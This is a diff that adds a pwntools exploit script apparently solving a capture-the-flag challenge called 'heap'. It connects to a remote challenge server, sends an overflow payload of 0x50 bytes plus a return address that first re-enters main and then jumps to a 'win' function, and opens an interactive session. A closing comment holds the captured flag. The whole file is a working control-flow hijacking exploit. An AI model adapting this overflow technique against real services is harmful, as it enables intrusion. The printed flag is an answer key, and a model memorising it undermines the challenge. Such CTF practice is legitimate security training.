@@ -1,0 +1,22 @@
+from pwn import *
+
+e = ELF("./heap")
+
+script = '''
+b *main
+b *main + 231
+'''
+
+p = remote("103.69.97.144", 6091)
+#p = gdb.debug("./heap", gdbscript = script)
+
+main = 0x0000000000401964
+win = 0x0000000000401854
+payload = b"A" * 0x50 + p64(main)
+p.sendlineafter(b"string: ", payload)
+
+payload = b"A" * 0x50 + p64(win)
+p.sendline(payload)
+
+p.interactive()
+#BKSEC{Just_a_h34p_0v3rfl0w!!!}
